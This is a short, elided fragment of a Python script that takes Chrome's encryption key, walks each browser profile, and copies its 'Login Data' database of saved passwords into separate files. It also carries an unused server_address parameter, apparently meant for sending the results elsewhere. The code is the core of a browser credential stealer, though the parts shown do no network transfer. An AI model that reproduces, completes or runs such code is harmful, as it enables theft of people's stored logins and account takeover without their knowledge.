...
def process_chrome_profile(profile_path, server_address):
    key = get_encryption_key()
    db_path = os.path.join(profile_path, "Login Data")

    if not os.path.exists(db_path):
        print(f"Login Data file not found in {profile_path}")
        return

    filename = f"ChromeData_{os.path.basename(profile_path)}.db"
...
def main():
    ...
    for profile_name in os.listdir(profiles_path):
        ...
        if os.path.isdir(profile_path):
            process_chrome_profile(profile_path, None)  # Pass None as the server_address
